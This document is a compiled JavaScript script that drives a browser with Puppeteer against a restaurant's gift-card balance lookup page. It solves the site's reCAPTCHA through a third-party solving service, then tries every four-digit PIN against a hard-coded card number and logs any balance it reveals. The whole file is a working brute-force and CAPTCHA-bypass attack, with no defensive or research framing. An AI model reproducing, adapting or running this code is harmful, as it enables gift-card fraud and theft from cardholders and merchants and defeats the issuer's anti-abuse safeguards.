"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
const ac = require("@antiadmin/anticaptchaofficial");
const puppeteer = require("puppeteer");
const config = require("./config.json");
const number = "6006496612521300008";
ac.setAPIKey("sadasdasfasfasfdasfasfasffsfsa");
function loginUser(options) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            console.log("solving recaptcha ...");
            let token = yield ac.solveRecaptchaV2Proxyless("https://wbiprod.storedvalue.com/WBI/lookupservlet?language=en&host=joeyrestaurants.com", "6LckryETAAAAAPFZhVfos9Ays4NSWb_7POn1-Y-u");
            if (!token) {
                console.log("something went wrong");
                return;
            }
            console.log("Generated pin is:", options.pin);
            const browser = yield puppeteer.launch({
                args: ["--start-maximized"],
                headless: false,
                slowMo: 10,
                defaultViewport: null,
            });
            const page = yield browser.newPage();
            yield page.setDefaultNavigationTimeout(0);
            yield page.setViewport({ width: 1366, height: 768 });
            yield page.goto("https://wbiprod.storedvalue.com/WBI/lookupservlet?language=en&host=joeyrestaurants.com", {
                waitUntil: "load",
                // Remove the timeout
                timeout: 0,
            });
            yield page.waitForNavigation({ waitUntil: "domcontentloaded" });
            //* adds number
            console.log("filling number input ..");
            yield page.waitForSelector('input[name="cardNoH"]', {
                waitUntil: "load",
                timeout: 0,
                visible: true,
            });
            yield page.type('input[name="cardNoH"]', number, {
                delay: 50,
            });
            yield page.waitForNavigation({ waitUntil: "domcontentloaded" });
            //* adds pin
            console.log("filling pin input ..");
            yield page.type("#Pin", options.pin, {
                delay: 50,
            });
            console.log("setting recaptcha g-response ...");
            yield page.$eval("#g-recaptcha-response", (element, token) => {
                element.value = token;
            }, token);
            //* click submit
            console.log("submitting form .. ");
            yield page.click('input[name="action"]', {
                delay: 50,
            });
            yield page.waitForNavigation({ waitUntil: "domcontentloaded" });
            const content = yield page.evaluate(() => {
                let rowList = [];
                let rows = document.querySelectorAll("form");
                rows.forEach((row) => {
                    const tdList = Array.from(row.querySelectorAll("p"), (column) => column.innerText);
                    if (tdList.length >= 2) {
                        // push the data
                        rowList.push({
                            number: tdList[0],
                            balance: tdList[1],
                        });
                    }
                });
                return rowList;
            });
            console.log(content);
            console.log(options.pin);
            // console.log(balance);
            //* close the browser
            yield browser.close();
        }
        catch (e) {
            console.log(e);
        }
    });
}
let main = () => __awaiter(void 0, void 0, void 0, function* () {
    for (let i = 0; i < 9999; i++) {
        let guess = String(i).padStart(4, "0");
        yield Promise.all([
            loginUser({
                pin: guess,
            }),
        ]);
    }
});
main();
